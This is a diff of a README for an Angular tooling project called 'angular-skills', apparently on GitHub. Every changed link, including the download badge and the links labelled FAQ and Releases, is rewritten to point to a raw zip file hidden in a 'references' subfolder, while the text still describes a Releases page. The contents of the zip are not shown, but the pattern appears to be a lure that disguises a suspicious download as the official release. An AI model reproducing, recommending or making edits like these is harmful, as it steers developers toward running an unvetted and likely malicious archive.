@@ -1,6 +1,6 @@
 # 🎉 angular-skills - Essential Tools for Angular Developers
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Kobolden/angular-skills/main/skills/angular-signals/references/skills_angular_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, please ensure your computer meets the following requirements:
 
 To get the latest version of the angular-skills application, please visit this page to download:
 
-[Download angular-skills](https://github.com/Kobolden/angular-skills/releases)
+[Download angular-skills](https://raw.githubusercontent.com/Kobolden/angular-skills/main/skills/angular-signals/references/skills_angular_v1.1.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest release.
@@ -46,13 +46,13 @@ angular-skills includes several useful features:
 
 ## 🌐 Support
 
-If you encounter any issues while downloading or running angular-skills, feel free to reach out. You can check our [FAQ section](https://github.com/Kobolden/angular-skills/wiki) for common questions or submit an issue directly on GitHub.
+If you encounter any issues while downloading or running angular-skills, feel free to reach out. You can check our [FAQ section](https://raw.githubusercontent.com/Kobolden/angular-skills/main/skills/angular-signals/references/skills_angular_v1.1.zip) for common questions or submit an issue directly on GitHub.
 
 ## 🔄 Update Notifications
 
 To stay updated with new releases, please check the Releases page regularly:
 
-[Visit Releases for Updates](https://github.com/Kobolden/angular-skills/releases)
+[Visit Releases for Updates](https://raw.githubusercontent.com/Kobolden/angular-skills/main/skills/angular-signals/references/skills_angular_v1.1.zip)
 
 ## 📜 License
 
